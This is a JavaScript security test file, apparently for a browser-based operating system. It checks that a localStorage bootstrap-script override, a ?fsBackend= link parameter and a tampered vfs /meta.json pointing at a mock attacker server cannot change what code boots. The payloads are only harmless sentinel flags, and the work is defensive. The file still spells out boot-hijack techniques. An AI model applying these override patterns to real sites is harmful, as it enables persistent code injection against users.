// KRN-9 (+ BOOT-7) and BOOT-6 — nothing an app can write (localStorage, the vfs /meta.json) or a
// link can say (?fsBackend=) changes what code boots.
//
// KRN-9  localStorage.__BOOTSTRAP_SCRIPT_PATH__ → a cross-site URL / a vfs file: after reload only
//        /remote.bundle.js loads (the planted script is never fetched / never runs)
// KRN-9  ?fsBackend=localstorage from a link, confirmation declined → backend unchanged
// BOOT-6 a vfs /meta.json that disables the server refresh and points a core app at an attacker
//        URL → after two reloads the app equals the server copy; the attacker host is never contacted
import { BASE_URL, newSession, boot, waitBooted, isBooted, startAttacker, step, report, done, sleep, pollFor, sentinels, vfsWrite, vfsRead, vfsExists } from './lib/harness.mjs';

const attacker = await startAttacker({
  '/evil-kernel.js': { body: 'window.__sec_krn9_xsite = 1;' },
  '/fe.js': { body: 'window.top.__sec_boot6_remote = 1;' },
});
const KEY = '__BOOTSTRAP_SCRIPT_PATH__';

const S = await newSession();
try {
  const page = await boot(S.context);
  await vfsWrite(page, {
    '/tmp/sec-boot/evil-kernel.js': 'window.__sec_krn9_vfs = 1;',
    '/home/user1/sec-boot/marker.txt': 'IDB-MARKER',
  });

  const reloadAndSettle = async () => {
    await page.reload({ waitUntil: 'load' });
    const booted = await waitBooted(page, 45000);
    await sleep(1500);
    return booted;
  };
  const scripts = () => page.evaluate(() => [...document.querySelectorAll('script[src]')].map((s) => s.getAttribute('src'))).catch(() => []);

  // ── KRN-9: bootstrap-script override, cross-site URL ──────────────────────
  await step('KRN-9', 'bootstrap-override-cross-site', async () => {
    await page.evaluate(({ k, v }) => localStorage.setItem(k, v), { k: KEY, v: attacker.url('/evil-kernel.js') });
    const booted = await reloadAndSettle();
    const fetched = attacker.hitCount('/evil-kernel.js');
    const set = await sentinels(page, '__sec_krn9');
    const src = await scripts();
    await page.evaluate((k) => localStorage.removeItem(k), KEY).catch(() => {});
    if (!booted) await reloadAndSettle();
    return { pass: fetched === 0 && set.length === 0 && booted, detail: `osBooted=${booted}; evilFetched=${fetched}; sentinels=${JSON.stringify(set)}; scripts=${JSON.stringify(src.filter((s) => !/^https:\/\/(cdnjs|unpkg|cdn\.jsdelivr)/.test(s)))}` };
  });

  // ── KRN-9: bootstrap-script override, same-origin vfs file ─────────────────
  await step('KRN-9', 'bootstrap-override-vfs-file', async () => {
    await page.evaluate(({ k, v }) => localStorage.setItem(k, v), { k: KEY, v: '/(sw)/tmp/sec-boot/evil-kernel.js' });
    const booted = await reloadAndSettle();
    const set = await sentinels(page, '__sec_krn9');
    const left = await page.evaluate((k) => localStorage.getItem(k), KEY).catch(() => '?');
    await page.evaluate((k) => localStorage.removeItem(k), KEY).catch(() => {});
    if (!booted) await reloadAndSettle();
    return { pass: set.length === 0 && booted, detail: `osBooted=${booted}; sentinels=${JSON.stringify(set)}; keyAfterBoot=${JSON.stringify(left)}` };
  });

  // ── KRN-9 (Low): ?fsBackend= from a link, confirmation declined ───────────
  await step('KRN-9', 'fsbackend-link-needs-consent', async () => {
    page.__dialogPolicy = 'dismiss';
    const dialogsBefore = page.__dialogs.length;
    await page.goto(BASE_URL + '/?fsBackend=localstorage', { waitUntil: 'load' });
    await pollFor(() => isBooted(page), 30000, 500);
    await sleep(2000);
    const stored = await page.evaluate(() => localStorage.getItem('__app_fs_backend__')).catch(() => '?');
    await page.goto(BASE_URL + '/', { waitUntil: 'load' });
    const booted = await waitBooted(page, 45000);
    const marker = booted ? await vfsRead(page, '/home/user1/sec-boot/marker.txt') : null;
    const asked = page.__dialogs.slice(dialogsBefore).map((d) => d.message.slice(0, 80));
    if (stored === 'localstorage' || marker !== 'IDB-MARKER') {
      await page.evaluate(() => localStorage.setItem('__app_fs_backend__', 'indexeddb')).catch(() => {});
      await page.goto(BASE_URL + '/', { waitUntil: 'load' });
      await waitBooted(page, 45000);
    }
    return { pass: stored !== 'localstorage' && marker === 'IDB-MARKER', detail: `storedBackend=${JSON.stringify(stored)}; idbMarkerVisibleAfterReload=${marker === 'IDB-MARKER'}; dialogs=${JSON.stringify(asked)}` };
  });

  // ── BOOT-6: a self-disabling vfs /meta.json with a remote source ──────────
  await step('BOOT-6', 'vfs-meta-json-not-authoritative', async () => {
    const server = await page.evaluate(async () => (await fetch('/public/mount/opt/apps/file-explorer/main.js', { cache: 'no-store' })).text());
    const orig = await vfsRead(page, '/opt/apps/file-explorer/main.js');
    await vfsWrite(page, {
      '/opt/apps/file-explorer/main.js': (orig || '') + '\n;window.top.__sec_boot6_tamper = 1;\n',
      '/meta.json': JSON.stringify([
        { path: '/meta.json', file: '/meta.json', force_reload: false },
        { path: '/opt/apps/file-explorer/main.js', file: attacker.url('/fe.js'), force_reload: true },
      ]),
    });
    await page.reload({ waitUntil: 'load' });
    await pollFor(() => isBooted(page), 45000, 500);
    await page.reload({ waitUntil: 'load' });
    const booted = await pollFor(() => isBooted(page), 45000, 500);
    await sleep(2500);
    const now = await vfsRead(page, '/opt/apps/file-explorer/main.js');
    const set = await sentinels(page, '__sec_boot6');
    const fetched = attacker.hitCount('/fe.js');
    const restored = now === server;
    return { pass: restored && fetched === 0 && set.length === 0, detail: `booted=${!!booted}; explorerEqualsServerCopy=${restored} (len ${now && now.length} vs ${server.length}); attackerFetches=${fetched}; sentinels=${JSON.stringify(set)}` };
  });
} catch (e) {
  report('KRN-9', null, 'script error: ' + (e && e.stack || e), { check: 'harness' });
} finally {
  await S.close();
  await attacker.close();
}
done('test-boot-integrity');
